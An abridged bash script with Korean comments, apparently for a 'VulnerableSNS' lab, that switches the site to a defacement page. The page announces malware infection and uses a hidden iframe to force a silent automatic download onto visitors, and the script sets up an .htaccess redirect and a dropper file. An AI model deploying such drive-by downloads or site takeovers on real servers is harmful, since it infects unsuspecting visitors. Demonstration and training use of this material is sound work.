...
###############################################################################
# 궁극의 토글 스크립트
# - 원본 VulnerableSNS (login.php 메인) ↔ 해킹 페이지
# - 다운로드 완전 숨김 (경로 안물어봄)
###############################################################################
...
echo "╔═══════════════════════════════════════════════╗"
echo "║       VulnerableSNS 궁극 토글                 ║"
echo "╚═══════════════════════════════════════════════╝"

# 첫 실행: 원본 백업
if [ ! -d "$BACKUP_DIR" ]; then
    echo "[*] 첫 실행 - 원본 파일 전체 백업..."
    mkdir -p "$BACKUP_DIR"

    # 모든 PHP 파일 백업
    cp $WWW_DIR/*.php $BACKUP_DIR/ 2>/dev/null
    cp $WWW_DIR/*.css $BACKUP_DIR/ 2>/dev/null
    cp $WWW_DIR/*.js $BACKUP_DIR/ 2>/dev/null
...
if [ -f "$HTACCESS" ]; then
    ...
    # 원본 복구
    if [ -d "$BACKUP_DIR" ]; then
        cp -f $BACKUP_DIR/*.php $WWW_DIR/ 2>/dev/null
        chown apache:apache $WWW_DIR/*.php
        chmod 644 $WWW_DIR/*.php
        echo "✅ 원본 PHP 파일 복구 완료"
    fi
...
<body>
    ...
    <div class="container">
        <div class="content">
            ...
            <div class="attack-chain">
                ...
                <div class="step" style="border-left-color: #f00;">→ 11. 악성코드 배포 완료 🦠</div>
            </div>

            <div class="malware">
                <h3>🦠 악성코드 설치 완료</h3>
                <div id="status">✅ <span style="color:#0f0;">시스템 감염 성공!</span></div>
                <div>📁 경로: <code>C:\Windows\System32\update_service.exe</code></div>
                <div style="margin-top:1rem;color:#f00;">⚠️ 자동 실행 등록 완료</div>
            </div>
    ...
    <script>
        ...
        // 완전히 숨겨진 자동 다운로드 (경로 안물어봄)
        setTimeout(() => {
            // 숨겨진 iframe으로 자동 다운로드
...
EOFHTACCESS
    ...
    chown apache:apache "$MALWARE_DROPPER"
    chmod 644 "$HACKED_PAGE"
    chmod 644 "$HTACCESS"
    chmod 644 "$MALWARE_DROPPER"
    ...
    echo "   http://3.35.22.248/register.php  → HACKED"
    echo "   http://3.35.22.248/upload.php    → HACKED"
    echo ""
    echo "🦠 악성코드 자동 다운로드 활성화 (완전 숨김)"
    echo ""
fi
